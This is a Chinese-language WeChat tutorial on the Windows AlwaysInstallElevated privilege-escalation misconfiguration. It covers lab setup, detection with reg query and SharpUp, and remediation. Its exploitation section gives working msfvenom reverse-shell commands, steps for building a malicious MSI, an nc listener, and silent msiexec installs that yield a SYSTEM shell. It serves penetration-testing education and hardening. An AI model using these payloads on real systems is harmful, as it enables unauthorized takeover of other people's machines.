---
title: 【提权基础入门第一节】AlwaysInstallElevated：一个常被忽视的Windows提权漏洞
url: https://mp.weixin.qq.com/s/s857iqU4L67OhFoWjOu47w
source: Doonsec's feed
date: 2026-03-22
fetch_date: 2026-03-23T04:21:56.504394
---

# 【提权基础入门第一节】AlwaysInstallElevated：一个常被忽视的Windows提权漏洞

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibfQU43WSZQXP73ibvauy9CCFC9zkHrYaqh2K4q5svnGuicELklKial4iaPE6oJ358tu2hib3DO8f3dmyE7EBUicNHIib1PkxWcPUhiamCk/0?wx_fmt=jpeg)

# 【提权基础入门第一节】AlwaysInstallElevated：一个常被忽视的Windows提权漏洞

塑造者壹号
塑造者壹号

幻泉之洲

![]()

在小说阅读器中沉浸阅读

> 普通用户也能进行提权安装？Windows的“始终以提升的权限安装”策略配置不当，会给攻击者留下多大的后门？这篇文章通过搭建环境、手动与工具检测、生成恶意MSI文件、静默执行提权到最终修复，手把手带你复现并理解这个经典漏洞的完整利用链。

## 这个漏洞到底是怎么回事

想象一下，你在一台Windows电脑上只是个普通用户，没管理员权限，但系统有个配置，让你可以用管理员权限安装任何软件。听起来不可思议，但这正是“AlwaysInstallElevated”漏洞干的事。

它本质上是Windows注册表里的两个开关，分别对应计算机和用户配置。当这两个开关同时被设置为“已启用”时，Windows安装程序服务就会向任何用户开放管理员特权。攻击者利用这点，可以轻松制作一个恶意的MSI安装包，然后用普通用户权限静默运行它，直接拿到系统最高权限。

这往往是系统管理员图省事留下的坑，为后续渗透打开了方便之门。

## 自己动手搭个实验环境

在复现攻击之前，得先把漏洞环境给配出来。你有两种方法可选。

### 方法一：手动配置组策略

首先，你需要一个管理员权限的命令提示符或PowerShell窗口。

1. 运行 `gpedit.msc` 打开本地组策略编辑器。
2. 找到“计算机配置 -> 管理模板 -> Windows组件 -> Windows Installer”。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibdnvds7f2c1vkgUB97RPIicsq9rnVzegLrsiaP4jPdjzxxMDPThqYD2aLl0rvG1IocUy66U1zdx2XicKhrSt6JUqbheraAm3EDMFA/640?wx_fmt=png&from=appmsg)

3. 找到策略“始终以提升的权限安装”，双击它。

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibe8ibecKflTVfRtt8lcLXKrtDdv5xFdlnPaOBru0UJGuV9EsuNuZvTZ9c1QrQfiatPyvjjsyDBAOAJdSM7YzfiaF5bevrb35HbPP0/640?wx_fmt=png&from=appmsg)

4. 将策略状态改为“已启用”，然后点击“确定”。

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibfsqPHvd5FzwnZhibmIBPa6JARxGf5kIgj9Kg8vib6eWTC00WGRic7zicgeib7GJD44n6bHaIlGTUdATicNIQqDKW97LZ26Jg2RF2uFk/640?wx_fmt=png&from=appmsg)

5. 别急，还有用户配置。转到“用户配置 -> 管理模板 -> Windows组件 -> Windows Installer”。

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibcop5pcOYXhNEwKWIhOx44KH584Ls8ZAibrqVGPay3a7iczGicZM6ra78GibcvjZGTmibILT42TdoicPneHQSjXYVarib6KLPHoLtDRFY/640?wx_fmt=png&from=appmsg)

6. 同样找到并启用“始终以提升的权限安装”策略。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibcFMy6I9JMKaYQUo6YmcgWMefHJ6uBQP3PkO2qKM7j8qMgX5Rk5oqEiciacuo6EnUY3UrxNvrVxd3ObicORphdCpr2keLialWZHpkk/640?wx_fmt=png&from=appmsg)

7. 确认策略状态已启用。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibeSSC3tv0rz9m5JEKTzkNMASictibayEXnEV2fvNrRnOicNXibCFAS9EDyIIA4zq7M6utZ2ga4rC0YATHZFmMZmTicGYqtpmydxiaicms/640?wx_fmt=png&from=appmsg)

8. 回到管理员命令行，执行 `gpupdate /force` 强制更新组策略。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibenek7zvJ517dibj97VmwC0QAfiaic1R8CQ9ialJqxy9PEz0JAZUspT3DqTZop6Nu3ykHX1icltH8ntchTvzg7dLv31IbRHW6bM84KA/640?wx_fmt=png&from=appmsg)

看到策略更新成功，漏洞环境就搭好了。

### 方法二：一键PowerShell脚本（更省事）

如果你嫌手动点来点去太麻烦，可以用作者提供的脚本。同样在管理员PowerShell里运行：

.\AlwaysInstallElevated.ps1

脚本会自动完成上面所有的配置工作。

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibehvLZs67QMYaLRGR2BL0qWvdrgDEmmFT5jsTWrZ22TOAZAEOJPyYaic5orufV4DxjwjM3LWx1BLQBOicAhTQqUT4ib9aC3sGynNw/640?wx_fmt=png&from=appmsg)

## 怎么判断目标机器有没有这个漏洞

环境搭好了，现在假设你是个攻击者，摸到了一台机器，怎么快速检查它有没有开这个后门？

### 手动查询注册表

最快的方法就是查注册表。开个CMD或者PowerShell，跑下面两条命令：

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

第一条查计算机范围的配置，第二条查当前用户下的配置。只要看到任何一条命令返回的结果里，`AlwaysInstallElevated` 的值是 `0x1`，那这台机器就有问题了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibecXiclZe1eHxTaxiafYJ3pvuDCwanbnAPkWrWsQaqGKKTUxcvKI8vc26bsogDC115pHlEwEFziaLSts7GryYDwGz944wYqsIGibf8/640?wx_fmt=png&from=appmsg)

记住，**两个键值都必须为1，漏洞才真正可利用**。如果只有一个为1，可能是因为策略没同步或配置不完整。

### 用工具自动扫描（SharpUp）

手动检查没问题，但渗透中讲究效率。你可以用像SharpUp这样的工具来批量或全面检查。运行：

SharpUp.exe audit AlwaysInstallElevated

它会直接告诉你是否存在这个漏洞。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibciaUlzEUibbUB1F0vdl6icHrUmCGJS5ededF8oA6O54ib6icXKHpXF2Hqaia85VYcPSAhamRdlpFA390qpnDkpjwuDRyBYIyBv56OeM/640?wx_fmt=png&from=appmsg)

SharpUp的功能不止于此，运行 `SharpUp.exe audit` 不加参数，它会帮你检查系统里所有常见的不安全配置，是内网渗透的利器。

## 关键部分：如何利用漏洞提权

检测出漏洞只是开始，真正的重头戏是把它变成我们手里的管理员权限。这里讲解两种 exploit 方法。

### 手动制作恶意MSI安装包

这种方法稍微复杂点，但能让你更清楚MSI文件是怎么运作的。

首先，你得有个Visual Studio，并且安装一个叫“Microsoft Visual Studio Installer Projects 2022”的扩展。在VS的“扩展 -> 管理扩展”里，在线搜索安装就行。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibcLcvI6eCbzibqrA3Hhgde0CEo1EhS8hHSCK19HMLY496lqFf0VTBHwYnAld4Bia4UJ1pmIxDia14QU8jYnP6ad1g8Fgk1d5BH1X8/640?wx_fmt=png&from=appmsg)

**准备工作：生成恶意载荷**

在攻击机（比如Kali）上，用msfvenom生成一个反向shell的可执行文件：

msfvenom -p windows/x64/shell\_reverse\_tcp lhost=你的IP lport=1234 -f exe > payload.exe

**第一步：创建安装项目**

在Visual Studio里新建项目，搜索“Setup Wizard”（安装向导）。

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibefCicVtxj5qyRq655U2g2LqHYAHDnvpZ3mria6hpviaWGvVibMsw8jMicm1wuxPHEsGpL6ErVYbqccFdLoNFaNjtYLbzXwU1mdNDzU/640?wx_fmt=png&from=appmsg)

给项目起个名字，比如“EvilInstaller”，选个保存路径。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibcne4XI5Qsia20nvvKK9TqOxyDqLelSQsR2DsxO5cR5fVHn5MS1VlGWv8n22DVWs1G9Tvk0sMYG4wrOG1XeP44duuVicFletW174/640?wx_fmt=png&from=appmsg)

**第二步：捆绑恶意文件**

在安装向导第三步，选择“添加文件”，把刚才生成的`payload.exe`加进去，然后完成向导。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibeuxjUBylK3QcTYJqkTaKdQwsOO0AjTkkrUwjiccQuzppntwYAOd601yeFuIN8v1eC6kNQqo7N0NFqLX8GkQaEY0gF1ZQBsSaib8/640?wx_fmt=png&from=appmsg)

**第三步：关键配置**

1. 在解决方案资源管理器里选中你的项目，在属性面板把“TargetPlatform”从x86改成x64。

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibde9nbxgotrqleyMpVTgssDicTC1iasogE1w66IzhJzS1fHbe8nWjpSHkgpEbvibHFaI7hgc2S2CKyUVSDb0iceeRHQDRuvrcHHTyc/640?wx_fmt=png&from=appmsg)

2. 右键项目，选择“视图 -> 自定义操作”。

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibehpkvFribwz0l4Lb2yBds244FavzvbBdfVoGFibicusJsuysrmW1TH3a9ylh7dianKwFjh0FoW6fUKaqyguRNKQnbV4yGibaHeUYcU/640?wx_fmt=png&from=appmsg)

3. 在打开的窗口中，右键“安装”，选择“添加自定义操作”。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibdcEfjG5UYxJxDbRQbqt7JmhXQp4YfiaY6rYle07BJ63KwicwGdb1XjIibwsclW1cBlcxhnPv9xKDKPme5uNhITV792swkuYkvXSY/640?wx_fmt=png&from=appmsg)

4. 双击“应用程序文件夹”，选中你的`payload.exe`，点确定。这一步确保了安装程序一运行就会执行我们的木马。

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibcgLicjf69gV0dMgYnObXzK6K3ztYJmhcticuQuJWoCB7DlGMXq4coQAdcy5JDkF3gztY3VmQZfRo9KOf7lM6k19Nj219BX3icT9g/640?wx_fmt=png&from=appmsg)

5. 在属性窗口里，找到“Run64Bit”选项，把它从False改成True。

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibcTO8Bwc0wD43qWKgkDhRznFsESDKxKcomiag1lBCPDSHibYk7eXCplVQ1HBY6cayX6u5JbWBepIAoKrz5s2lo7FwCN8bvMZzHib0/640?wx_fmt=png&from=appmsg)

**第四步：编译与执行**

1. 在VS里生成解决方案，你会得到一个`EvilInstaller.msi`文件。
2. 在Kali上启动监听器：`nc -nvlp 1234`。
3. 把`EvilInstaller.msi`文件弄到目标Windows机器上。
4. 在目标机（普通用户权限即可）执行以下命令进行静默安装：

   msiexec /quiet /qn /i EvilInstaller.msi

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibcyZZpZBs0Ws6Zs3U7G7o7IxEwhfc0U3QGDfkrr2LaNSjkSJkvI8iaTuNGvgibH8LVWJiacglftrcgqhsCXB3TtMy0icRKPVEVicXW0/640?wx_fmt=png&from=appmsg)

命令执行后，如果漏洞存在，你的Kali监听器应该会弹回一个具有系统权限的shell。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibfJib87xD7z8aLD7UpWORKHd5viaHw9lkzfRdVlvtOibuGNHNAvrrD0dXHgOyLJ7D1ib7KcGAQxOLBjjttX2576A410GawIbj3X53w/640?wx_fmt=png&from=appmsg)

成功后别忘了清理现场，在目标机运行：`msiexec /q /n /uninstall EvilInstaller.msi` 可以卸载这个MSI包。

### 懒人方法：直接用msfvenom生成MSI

如果你觉得用Visual Studio太绕，msfvenom其实可以直接生成恶意的MSI文件，一步到位。

msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=你的IP LPORT=4444 -f msi > quick.msi

生成后，把它传到目标机器，同样用 `msiexec /quiet /qn /i quick.msi` 命令执行。效果和上面手动做的一样。

卸载命令也类似：`msiexec /q /n /uninstall quick.msi`。

这个方法更快，但生成的MSI文件可能被一些安全软件标记。手动制作的方法更隐蔽，定制性也更强。

## 修复方案：把这个后门关上

如果你是系统管理员，看到这里应该已经冒冷汗了。修复其实很简单，就是把那两个组策略开关关掉。

1. 打开`gpedit.msc`。
2. 分别找到“计算机配置”和“用户配置”下的“Windows Installer”设置。
3. 将“始终以提升的权限安装”策略设置为“未配置”或“已禁用”。
4. 执行`gpupdate /force`。

或者，你也可以直接动注册表，把下面两处的`AlwaysInstallElevated`值改成`0`：

* `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
* `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`

根本原则就一条：**永远不要在生产环境中启用“AlwaysInstallElevated”策略**。软件安装需要权限，就应该走正规的管理员授权流程。

## 写在最后

AlwaysInstallElevated是一个典型的因便利性牺牲安全性的例子。它在红队评估和渗透测试中是一个高价值的发现点，因为利用起来非常稳定可靠。对于蓝队和系统管理员来说，这应该是一个必须检查并关闭的高危项。

安全往往就藏在那些看似不起眼的默认配置里。

---

> 参考资料：
>
> * AlwaysInstallElevated - Microsoft官方文档
> * Windows Installer 官方文档
> * 如何创建 Windows Installer 文件

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/KK6rkaWbMNbNvNRWVlQ1KyqceSk3WZAqKUsEjFj2Mfib1H7RQOOarzKolWvdD1W3PGicFOEABZLLpNoL2u9RdAXg/0?wx_fmt=png)

幻泉之洲

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二...